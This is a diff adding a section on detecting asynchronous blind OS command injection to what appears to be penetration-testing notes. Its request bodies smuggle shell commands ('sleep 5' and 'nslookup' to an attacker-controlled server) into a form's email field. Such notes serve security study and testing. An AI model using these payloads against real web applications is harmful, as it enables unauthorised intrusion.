@@ -50,3 +50,19 @@ csrf=32059523058230&name=test^email=test%40test.com||sleep+5||&subject=test&mess
 
 ---
 
+## Discovering Asynchronous Blind Command Injection Vulnerabilities
+
+For example when an OS command is executed in another thread and there is not way to check it in the response
+
+Solution: Use a command such as the `ping` or `nslookup` to cause the target web application to send a request to another server
+that you control. Then check the logs of the server you control for the request.
+
+```
+csrf=32059523058230&name=test^email=test%40test.com||nslookup+myserver.com||&subject=test&message=adfsdf
+```
+
+---
+
+
+
+
